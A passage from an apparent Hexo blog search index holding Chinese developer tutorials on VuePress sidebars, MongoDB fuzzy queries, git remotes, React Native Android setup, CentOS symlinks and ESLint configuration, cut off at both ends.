collapsable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            children<span class="token punctuation">:</span><span class="token punctuation">[</span>                <span class="token punctuation">[</span><span class="token string">'/new/testindex1.md'</span><span class="token punctuation">,</span> <span class="token string">'发布新框架'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token string">'/new/local/entry.md'</span><span class="token punctuation">,</span> <span class="token string">'本地开发'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token string">'/new/feedback/feedback.md'</span><span class="token punctuation">,</span> <span class="token string">'问题反馈'</span><span class="token punctuation">]</span>            <span class="token punctuation">]</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token string">'/feedback/feedback.md'</span><span class="token punctuation">,</span> <span class="token string">'问题反馈'</span><span class="token punctuation">]</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>侧边栏组默认情况下是可折叠的。你可以强制一个组始终以 <code>collapsable：false</code> 打开。</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/publish/vp6.png" alt></p><h2 id="多侧边栏"><a href="#多侧边栏" class="headerlink" title="多侧边栏"></a>多侧边栏</h2><p>如果你希望为不同的页面组显示不同的侧边栏，请先将页面组织到目录中：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">.</span>├─ README<span class="token punctuation">.</span>md├─ cst│  ├─ README<span class="token punctuation">.</span>md│  ├─ draft<span class="token punctuation">.</span>md│  └─ esc<span class="token punctuation">.</span>md└─ <span class="token keyword">new</span>   ├─ README<span class="token punctuation">.</span>md   ├─ local<span class="token operator">/</span>entry<span class="token punctuation">.</span>md   └─ feedback<span class="token operator">/</span>feedback<span class="token punctuation">.</span>md<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码展示：</p><pre class="line-numbers language-js"><code class="language-js">themeConfig<span class="token punctuation">:</span> <span class="token punctuation">{</span>    nav<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span> text<span class="token punctuation">:</span> <span class="token string">'主页'</span><span class="token punctuation">,</span> link<span class="token punctuation">:</span> <span class="token string">'/'</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>             text<span class="token punctuation">:</span> <span class="token string">'技术'</span><span class="token punctuation">,</span>            items<span class="token punctuation">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">{</span> text<span class="token punctuation">:</span> <span class="token string">'车商通'</span><span class="token punctuation">,</span> link<span class="token punctuation">:</span> <span class="token string">'/cst/'</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token punctuation">{</span> text<span class="token punctuation">:</span> <span class="token string">'新框架'</span><span class="token punctuation">,</span> link<span class="token punctuation">:</span> <span class="token string">'/new/'</span> <span class="token punctuation">}</span>            <span class="token punctuation">]</span>        <span class="token punctuation">}</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>    sidebar<span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token string">'/cst/'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>            <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'车商通'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token punctuation">[</span><span class="token string">'draft'</span><span class="token punctuation">,</span> <span class="token string">'草稿箱'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token punctuation">[</span><span class="token string">'esc'</span><span class="token punctuation">,</span> <span class="token string">'二手车'</span><span class="token punctuation">]</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'/new/'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>            <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'发布新框架'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token punctuation">[</span><span class="token string">'local/entry.md'</span><span class="token punctuation">,</span> <span class="token string">'本地开发'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token punctuation">[</span><span class="token string">'feedback/feedback.md'</span><span class="token punctuation">,</span> <span class="token string">'问题反馈'</span><span class="token punctuation">]</span>        <span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/publish/vp7.png" alt></p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/publish/vp8.png" alt></p><p><code>注意：在本地开发时每个侧边栏目录里面都要有README文件，导航切换到每个目录下默认寻找README，否则直接展示不出来；并且配置sidebar时，每组的第一位直接写空字符串的key</code></p>]]></content>
      
      
      <categories>
          
          <category> 工具类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB多条件模糊查询</title>
      <link href="2019/08/30/mgsearch/"/>
      <url>2019/08/30/mgsearch/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>模糊查询是数据库的基本操作之一，实现对给定的字符串是否与指定的模式进行匹配。如果字符完全匹配，可以用=等号表示，如果部分匹配可认为是一种模糊查询。在关系型数据中，通过SQL使用like ‘%fens%’的语法。那么在mongodb中我们应该如何实现模糊查询的效果呢。</p><h2 id="查询条件"><a href="#查询条件" class="headerlink" title="查询条件"></a>查询条件</h2><table><thead><tr><th>关键字</th><th>说明</th></tr></thead><tbody><tr><td>$or</td><td>或关系</td></tr><tr><td>$nor</td><td>或关系取反</td></tr><tr><td>$gt</td><td>大于</td></tr><tr><td>$gte</td><td>大于等于</td></tr><tr><td>$lt</td><td>小于</td></tr><tr><td>$lte</td><td>小于等于</td></tr><tr><td>$ne</td><td>不等于</td></tr><tr><td>$in</td><td>在多个值范围内</td></tr><tr><td>$nin</td><td>不在多个值范围内</td></tr><tr><td>$all</td><td>匹配数组中多个值</td></tr><tr><td>$regex</td><td>正则，用于模糊查询</td></tr><tr><td>$size</td><td>匹配数组大小</td></tr><tr><td>$maxDistance</td><td>范围查询，距离（基于LBS）</td></tr><tr><td>$mod</td><td>取模运算</td></tr><tr><td>$near</td><td>邻域查询，查询附近的位置（基于LBS）</td></tr><tr><td>$exists</td><td>字段是否存在</td></tr><tr><td>$elemMatch</td><td>匹配内数组内的元素</td></tr><tr><td>$within</td><td>范围查询（基于LBS）</td></tr><tr><td>$box</td><td>范围查询，矩形范围</td></tr><tr><td>$center</td><td>范围查询，圆形范围</td></tr><tr><td>$centerSphere</td><td>范围查询，球形范围</td></tr><tr><td>$slice</td><td>查询字段集合中的元素（比如从第几个之后，第N到第M个元素）</td></tr></tbody></table><h2 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h2><h3 id="精准查询"><a href="#精准查询" class="headerlink" title="精准查询"></a>精准查询</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//Mongodb数据库表</span><span class="token keyword">const</span> systemUser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../../models/user'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> systemUser<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">{</span>name<span class="token punctuation">:</span><span class="token string">'xiaoming'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span>rs<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="多条件模糊查询"><a href="#多条件模糊查询" class="headerlink" title="多条件模糊查询"></a>多条件模糊查询</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//Mongodb数据库表</span><span class="token keyword">const</span> systemUser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../../models/user'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//前端传入的要查询的关键字</span><span class="token keyword">var</span> name <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>name<span class="token punctuation">;</span><span class="token keyword">var</span> page <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>page <span class="token operator">||</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//当前页数</span><span class="token keyword">var</span> limitNums <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//指定每一页查询的条数</span>page <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> skipNums <span class="token operator">=</span> <span class="token punctuation">(</span>page <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> limitNums<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//跳过指定数量</span><span class="token comment" spellcheck="true">//正则匹配 i忽略大小写</span><span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> _filter <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//多字段匹配</span>    $or<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span>name<span class="token punctuation">:</span> <span class="token punctuation">{</span>$regex<span class="token punctuation">:</span> reg<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>description<span class="token punctuation">:</span> <span class="token punctuation">{</span>$regex<span class="token punctuation">:</span> reg<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>owner<span class="token punctuation">:</span> <span class="token punctuation">{</span>$regex<span class="token punctuation">:</span> reg<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span>systemUser<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>_filter<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">//跳过指定数量的数据</span><span class="token function">skip</span><span class="token punctuation">(</span>skipNums<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">//指定从MongoDB中读取的记录条数。</span><span class="token function">limit</span><span class="token punctuation">(</span>limitNums<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">{</span>createTime<span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span>rs<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> nodejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> mongoose </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git远程仓库</title>
      <link href="2019/08/25/gitbranch/"/>
      <url>2019/08/25/gitbranch/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在平时的开发中我们的代码管理一般都离不开git，在开发中也不可能永远都是开发别人已经上传搭建好的项目；新建本地项目并创建远程项目仓库地址是我们开发中必不可少的；下面我们就来一步步看一下如何实现。</p><h2 id="新建"><a href="#新建" class="headerlink" title="新建"></a>新建</h2><p>首先是要新建项目目录及项目文件，可以是拷贝原有老项目的基础上修改，也可以是直接新建；如：gitTest</p><pre class="line-numbers language-js"><code class="language-js">新建文件夹：mkdir gitTestcd gitTestcopy原有项目：mv <span class="token operator">**</span> gitTestcd gitTest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>在目录新建完成之后和git的完全没有关系 这就需要我们来把这个目录初始化成git可管理的仓库</p><pre class="line-numbers language-js"><code class="language-js">git init 完成项目git初始化<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果是拷贝的项目会把原有的仓库信息也拷贝过来，这是就不是你需要的新增的地址，此时需要：</p><pre class="line-numbers language-js"><code class="language-js">删除项目中的原有git仓库的所有依赖信息rm <span class="token operator">-</span>rf <span class="token punctuation">.</span>git再新增git仓库初始化git init<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在init完成之后在项目的更目录里面会有一个.git的文件夹，他就是永磊跟踪和管理版本库的。</p><h2 id="创建远程地址"><a href="#创建远程地址" class="headerlink" title="创建远程地址"></a>创建远程地址</h2><ul><li><p>git remote新增</p><pre class="line-numbers language-js"><code class="language-js">git remote add origin git@<span class="token operator">**</span><span class="token punctuation">.</span>com<span class="token punctuation">:</span>fe_ershouche<span class="token operator">/</span>docs<span class="token operator">/</span>gitTest<span class="token punctuation">.</span>git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>origin：远程库<br>git@**.com:fe_ershouche/docs/gitTest.git：仓库具体地址及名称</p></li><li><p>查看创建的远程仓库</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//列出每个远程库的简短名字</span>git remote<span class="token comment" spellcheck="true">//显示出对应的克隆地址</span>git remote <span class="token operator">-</span>v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/git6.png" alt="git6.png"></p><ul><li>如果报错fatal: remote origin already exists<br>说明要创建的远程库已被占用 如下：<br><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/git4.png" alt="git4.png"></li></ul><pre class="line-numbers language-js"><code class="language-js">  git remote 或者 git remote <span class="token operator">-</span>v 查看  origin已存在并且下面已存在具体仓库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  那么就需要我们删除远程已被占用的remote</p><pre class="line-numbers language-js"><code class="language-js">  git remote remove <span class="token operator">&lt;</span>name<span class="token operator">></span> 如上图：  git remote remove origin 直接删除origin远程库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  删除以后就是在重新add就可以了 如下：<br><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/reactnative/git5.png" alt="git5.png"></p><p>  完成上面操作就新建完成了远程仓库地址</p><h2 id="代码提交"><a href="#代码提交" class="headerlink" title="代码提交"></a>代码提交</h2><p>git代码仓库新建完成之后就是本地代码的提交了</p><ul><li><p>git status<br>可以使用git status查看本地的修改</p></li><li><p>git add .<br>直接把本地所有文件又提交</p></li><li><p>git commit<br>git commit -m “**” 添加本地提交的commit记录</p></li><li><p>git push<br>最后就是把代码push到新增的远程分支<br>git push origin master</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RN window下android环境搭建</title>
      <link href="2019/08/23/rnandroid/"/>
      <url>2019/08/23/rnandroid/</url>
      
        <content type="html"><![CDATA[<h2 id="开发软件依赖"><a href="#开发软件依赖" class="headerlink" title="开发软件依赖"></a>开发软件依赖</h2><h3 id="Python2"><a href="#Python2" class="headerlink" title="Python2"></a><strong>Python2</strong></h3><p>注：目前不支持Python3版本</p><p>下载地址<a href="https://www.python.org/downloads/release/python-2715/" target="_blank" rel="noopener">Python 2.7.15</a>，下载后直接安装即可。</p><h3 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h3><p>下载地址<a href="https://nodejs.org/zh-cn/download/releases/" target="_blank" rel="noopener">Node.js 7.6.0</a>，与React Native构建平台使用node版本一致</p><p>安装完 node 后建议设置 npm 镜像以加速安装第三方依赖。</p><blockquote><p>npm config set registry <a href="https://registry.npm.taobao.org/" target="_blank" rel="noopener">https://registry.npm.taobao.org</a> –global</p><p>npm config set disturl <a href="https://npm.taobao.org/dist" target="_blank" rel="noopener">https://npm.taobao.org/dist</a> –global</p></blockquote><h5 id="Yarn、React-Native的命令行工具（react-native-cli）"><a href="#Yarn、React-Native的命令行工具（react-native-cli）" class="headerlink" title="Yarn、React Native的命令行工具（react-native-cli）"></a><strong>Yarn、React Native的命令行工具（react-native-cli</strong>）</h5><p>Yarn是 Facebook 提供的替代 npm 的工具，可以加速 node 模块的下载。React Native 的命令行工具用于执行创建、初始化、更新项目、运行打包服务（packager）等任务。</p><blockquote><p>npm install -g yarn react-native-cli</p></blockquote><p>安装完 yarn 后同理也要设置镜像源：</p><blockquote><p>yarn config set registry <a href="https://registry.npm.taobao.org/" target="_blank" rel="noopener">https://registry.npm.taobao.org</a> –global</p><p>yarn config set disturl <a href="https://npm.taobao.org/dist" target="_blank" rel="noopener">https://npm.taobao.org/dist</a> –global</p></blockquote><p>安装完 yarn 之后就可以用 yarn 代替 npm 了，例如用yarn代替npm install命令，用yarn add 某第三方库名代替npm install –save 某第三方库名</p><h3 id="Android-Studio"><a href="#Android-Studio" class="headerlink" title="Android Studio"></a>Android Studio</h3><p>React Native 目前需要Android Studio2.0或更高版本</p><blockquote><p>Android Studio 需要 Java Development Kit [JDK] 1.8（暂不支持更高版本）。你可以在命令行中输入 javac -version来查看你当前安装的 JDK 版本。如果版本不合要求，则可以到 <a href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">官网</a>上下载</p></blockquote><p>下载地址<a href="https://developer.android.google.cn/studio/#downloads" target="_blank" rel="noopener">Android Studio</a>，如下图选择符合自己平台的</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/rn/android-down.png" alt></p><p>如果下载的是.zip安装包，解压后通过安装目录下bin下的studio64.exe即可打开Android Studio,在欢迎界面中选择Configure|SDK Manager：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/rn/android-config1.png" alt></p><p>在SDK Platforms窗口中，选择Show Package Details，然后在Android 6.0 (Marshmallow)中勾选Android SDK Platform 23</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/rn/android-config2.png" alt></p><p>在SDK Tools窗口中，选择Show Package Details，然后在Android SDK Build-Tools中勾选 23.0.1（必须包含有这个版本。当然如果其他插件需要其他版本，你可以同时安装其他多个版本）。然后还要勾选最底部的Android Support Repository.</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/rn/android-config3.png" alt></p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/rn/android-config4.png" alt></p><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><p>ANDROID_HOME：确保ANDROID_HOME环境变量正确地指向了你安装的 Android SDK 的路径（请自行确认自己本地安装路径）</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/rn/android-config5.png" alt></p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/rn/android-config6.png" alt></p><h2 id="模拟器-Genymotion"><a href="#模拟器-Genymotion" class="headerlink" title="模拟器 Genymotion"></a>模拟器 Genymotion</h2><ol><li><p>下载和安装<a href="https://www.genymotion.com/download/" target="_blank" rel="noopener">Genymotion</a>,需要先注册账号，登录后才能下载安装包</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/rn/genymotion-down.png" alt></p></li></ol><p>2.下载后直接点击安装即可（会安装两个软件，一个是Genymotion，另一个是VirtualBox虚拟机），须记住Genymotion的安装路径，安装Android Studio 插件时会用到。</p><p>3.点击Genymotion图标，Genymotion启动前会先启动虚拟机，如果出现下图报错，说明电脑默认虚拟化技术的配置项没有开启，需进入BIOS修改配置项。</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/rn/genymotion1.png" alt></p><p>4.开机时长按F10 开启BIOS设置，在Advanced里找到 system options 回车，最后勾选了Virtualizaton Technology这两个就开启虚拟化功能了</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/rn/genymotion4.jpeg" alt></p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/rn/genymotion3.png" alt></p><p>5.虚拟机开启后，genymotion首次进入，需选择使用模式，商业的需要购买认证，我们直接选择个人模式，无需购买认证，也没有使用天数限制。</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/rn/genymotion2.png" alt></p><p>6.用户登录，输入在官网注册的账号密码即可。不然无法安装模拟器。</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/rn/genymotion5.png" alt></p><p>7.点击Add下载各种版本虚拟机的文件信息了，下好了文件信息就能创建虚拟机，接下来就是Android Studio 和Genymotion关联了。</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/rn/genymotion6.png" alt></p><p>8.Android Studio 安装Genymotion插件</p><ul><li><p>打开Android Studio点击File/Setting</p></li><li><p>选中Plugins，在搜索框内填入Genymotion，点击下方的Browse repsosistories进行搜索，搜索到点击Install，等待安装即可。</p></li><li><p>然后就是重启Android studio,重启后多了个新图标，点击那个新图标或者点击File/Setting/找到Genymotion,配置Genymotion的安装路径</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/rn/genymotion7.png" alt></p></li></ul><h3 id><a href="#" class="headerlink" title=" "></a> </h3>]]></content>
      
      
      <categories>
          
          <category> ReactNative </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ReactNative </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos软连接创建</title>
      <link href="2019/08/21/centosln/"/>
      <url>2019/08/21/centosln/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=525278524&auto=1&height=66"></iframe><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经常使用centos系统的同学都知道，在全局安装命令指令时，即使是执行了npm install -g 但是安装之后的命令仍然说找不到 那么我们改如何操作呢？</p><h2 id="软连接"><a href="#软连接" class="headerlink" title="软连接"></a>软连接</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>centos下的<code>ln</code>命令就相当于window下的建立快捷方式，链接文件甚至可以链接不存在的文件，这就产生一般称之为”断链”的现象，链接文件甚至可以循环链接自己。 类似于编程语言中的递归。<br>软链接文件只是其源文件的一个标记，当删除了源文件后，链接文件不能独立存在，虽然仍保留文件名，但却不能查看软链接文件的内容了。</p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>ln -s 源文件 目标文件</p><pre class="line-numbers language-js"><code class="language-js">ln <span class="token operator">-</span>s <span class="token operator">/</span>opt<span class="token operator">/</span>soft<span class="token operator">/</span>node<span class="token operator">-</span>v8<span class="token number">.9</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token operator">-</span>linux<span class="token operator">-</span>x64<span class="token operator">/</span>bin<span class="token operator">/</span>vuepress <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-s 是代号（symbolic）的意思</p><ol><li>ln命令会保持每一处链接文件的同步性，也就是说，不论你改动了哪一处，其它的文件都会发生相同的变化</li><li>ln的链接又软链接 和硬链接两种，软链接就是ln -s xx xx,它只会在你选定的位置上生成一个文件的镜像，不会占用磁盘空间，硬链接ln ** **,没有参数-s, 它会在你选定的位置上生成一个和源文件大小相同的文件，无论是软链接还是硬链接，文件都保持同步变化。 </li></ol><h3 id="命令功能"><a href="#命令功能" class="headerlink" title="命令功能"></a>命令功能</h3><p>Linux文件系统中，有所谓的链接(link)，我们可以将其视为档案的别名，而链接又可分为两种 : 硬链接(hard link)与软链接(symbolic link)，硬链接的意思是一个档案可以有多个名称，而软链接的方式则是产生一个特殊的档案，该档案的内容是指向另一个档案的位置。硬链接是存在同一个文件系统中，而软链接却可以跨越不同的文件系统。</p><p><strong>软链接：</strong></p><p>1.软链接，以路径的形式存在。类似于Windows操作系统中的快捷方式<br>2.软链接可以 跨文件系统 ，硬链接不可以<br>3.软链接可以对一个不存在的文件名进行链接<br>4.软链接可以对目录进行链接</p><p><strong>硬链接:</strong></p><p>1.硬链接，以文件副本的形式存在。但不占用实际空间。<br>2.不允许给目录创建硬链接<br>3.硬链接只有在同一个文件系统中才能创建</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>-b 删除，覆盖以前建立的链接<br>-d 允许超级用户制作目录的硬链接<br>-f 强制执行<br>-i 交互模式，文件存在则提示用户是否覆盖<br>-n 把符号链接视为一般目录<br>-s 软链接(符号链接)<br>-v 显示详细的处理过程</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>eslint配置和rule规则解释</title>
      <link href="2019/08/17/eslint/"/>
      <url>2019/08/17/eslint/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ESLint 是一个ECMAScript/JavaScript 语法规则和代码风格的检查工具，它的目标是保证代码的一致性和避免错误。</p><p>借助 ESLint，可将 <strong>静态代码分析</strong> 和 <strong>问题代码协助修复</strong> 集成到 <strong>编码</strong>、<strong>提交</strong> 和 <strong>打包</strong> 过程中，及早发现并协助修复代码中：</p><ul><li>有语法错误的部分</li><li>不符合约定的样式准则的部分</li><li>不符合约定的最佳实践的部分</li></ul><p>在项目开发中获得如下收益：</p><ul><li>在执行代码之前发现并修复语法错误，减少调试耗时和潜在 bug</li><li>保证项目的编码风格统一，提高可维护性</li><li>督促团队成员在编码时遵守约定的最佳实践，提高代码质量</li></ul><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>配置文件中包含的相对路径和 glob 模式都是基于当前配置文件的路径进行解析的。</p><h3 id="两种主要的配置方式"><a href="#两种主要的配置方式" class="headerlink" title="两种主要的配置方式"></a>两种主要的配置方式</h3><ul><li>配置注释 - 在目标文件中使用注释语法嵌入配置信息。这种配置只对当前文件有效。</li><li>配置文件 - 在 <code>JavaScript</code>、<code>JSON</code> 或 <code>YAML</code> 文件中定义配置信息。对于这种配置方式，配置信息可以写在单独的 <code>.eslintrc.*</code> 文件中，或者写在 <code>package.json</code> 文件的 <code>eslintConfig</code> 字段中。这种配置对配置文件所在目录及其子目录树中的所有文件有效。</li></ul><h3 id="配置文件格式"><a href="#配置文件格式" class="headerlink" title="配置文件格式"></a>配置文件格式</h3><ul><li><code>JavaScript</code> - use <code>.eslintrc.js</code> 文件导出一个包含配置信息的对象。</li><li><code>JSON</code> - 使用 <code>.eslintrc.json</code> 定义配置信息，JSON 文件中支持 JavaScript 注释。</li><li><code>package.json</code> - 在 <code>package.json</code> 文件中增加一个 <code>eslintConfig</code> 字段，在该字段中定义配置信息。</li><li><code>.eslintrc</code> </li></ul><p>如果有多个配置 优先级如下：  </p><ol><li><code>.eslintrc.js</code></li><li><code>.eslintrc.json</code></li><li><code>.eslintrc</code></li><li><code>package.json</code></li></ol><h2 id="配置参数"><a href="#配置参数" class="headerlink" title="配置参数"></a>配置参数</h2><h3 id="parser"><a href="#parser" class="headerlink" title="parser"></a>parser</h3><p>指定 ESLint 使用的语法分析器。ESLint 兼容的语法分析器有：<a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fesprima" target="_blank" rel="noopener">Esprima</a>、<a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fbabel-eslint" target="_blank" rel="noopener">Babel-ESLint</a>、<a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2F%40typescript-eslint%2Fparser" target="_blank" rel="noopener">@typescript-eslint/parser</a>，ESLint 默认使用 <a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fesprima" target="_blank" rel="noopener">Esprima</a>。</p><h3 id="parserOptions"><a href="#parserOptions" class="headerlink" title="parserOptions"></a>parserOptions</h3><p>指定语法分析器选项，默认使用的语法分析器支持如下几个选项：<code>ecmaVersion</code>、<code>sourceType</code>、<code>ecmaFeatures</code>。示例：</p><pre class="line-numbers language-js"><code class="language-js">  <span class="token punctuation">{</span>    <span class="token 